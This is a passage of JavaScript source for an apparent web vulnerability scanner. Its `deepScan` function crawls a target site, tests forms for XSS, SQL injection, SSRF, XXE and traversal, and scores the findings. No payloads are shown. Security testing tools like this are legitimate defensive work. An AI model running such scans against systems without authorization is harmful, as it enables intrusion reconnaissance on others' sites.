    startTime: new Date().toISOString(),
  };

  try {
    if (!targetUrl.startsWith("http")) targetUrl = "http://" + targetUrl;
    const baseUrl = new URL(targetUrl).origin;

    console.log("Fetching:", targetUrl);
    let mainResponse;
    try {
      mainResponse = await axiosInstance.get(targetUrl);
    } catch (e) {
      throw new Error(`Could not reach target: ${e.message}`);
    }

    results.pagesScanned++;
    const headers = mainResponse.headers;
    const html = typeof mainResponse.data === "string" ? mainResponse.data : "";

    console.log("Running parallel checks...");
    const [
      headerF,
      cookieF,
      fileF,
      redirectF,
      wafR,
      cmsR,
      domXssF,
      xxeF,
      corsF,
    ] = await Promise.all([
      Promise.resolve(checkSecurityHeaders(headers)),
      Promise.resolve(checkCookies(headers)),
      checkSensitiveFiles(baseUrl),
      checkOpenRedirect(targetUrl),
      detectWAF(targetUrl, headers),
      detectCMS(targetUrl, html, headers),
      Promise.resolve(checkDOMXSS(html)),
      testXXE(targetUrl),
      checkCORS(targetUrl),
    ]);

    results.findings.push(
      ...headerF,
      ...cookieF,
      ...fileF,
      ...redirectF,
      ...wafR.findings,
      ...cmsR.findings,
      ...domXssF,
      ...xxeF,
      ...corsF,
      ...checkClickjacking(headers),
    );
    results.waf = wafR.detectedWAFs;
    results.cms = cmsR.detectedCMS;

    console.log("Crawling pages...");
    const visited = new Set();
    const { links, forms: mainForms } = await crawlPage(
      targetUrl,
      baseUrl,
      visited,
    );
    const allForms = [...mainForms];

    for (const link of links.slice(0, 5)) {
      const { forms } = await crawlPage(link, baseUrl, visited);
      allForms.push(...forms);
      results.pagesScanned++;
    }

    results.formsFound = allForms.length;
    results.findings.push(...checkCSRF(allForms));

    const [authF, jwtF, ssrfF, traversalF] = await Promise.all([
      checkBrokenAuth(allForms),
      checkJWT(headers),
      testSSRF(targetUrl, allForms),
      testDirectoryTraversal(allForms),
    ]);

    results.findings.push(...authF, ...jwtF, ...ssrfF, ...traversalF);

    console.log(`Testing ${Math.min(allForms.length, 10)} forms...`);
    for (const form of allForms.slice(0, 10)) {
      const [xss, sqli, blind] = await Promise.all([
        testXSS(form),
        testSQLi(form),
        testBlindSQLi(form),
      ]);
      results.findings.push(...xss, ...sqli, ...blind);
    }

    // Remove duplicates
    const seen = new Set();
    results.findings = results.findings.filter((f) => {
      const key = `${f.type}-${f.endpoint || ""}-${f.parameter || ""}`;
      if (seen.has(key)) return false;
      seen.add(key);
      return true;
    });

    results.summary = {
      critical: results.findings.filter((f) => f.severity === "Critical")
        .length,
      high: results.findings.filter((f) => f.severity === "High").length,
      medium: results.findings.filter((f) => f.severity === "Medium").length,
      low: results.findings.filter((f) => f.severity === "Low").length,
      info: results.findings.filter((f) => f.severity === "Info").length,
      total: results.findings.length,
    };

    results.riskScore = Math.min(
      100,
      results.summary.critical * 30 +
        results.summary.high * 15 +
        results.summary.medium * 8 +
        results.summary.low * 3,
    );

    results.endTime = new Date().toISOString();
    console.log(`Scan complete. ${results.findings.length} findings.`);
    return results;
  } catch (err) {
    throw err;
  }
}

module.exports = { deepScan };
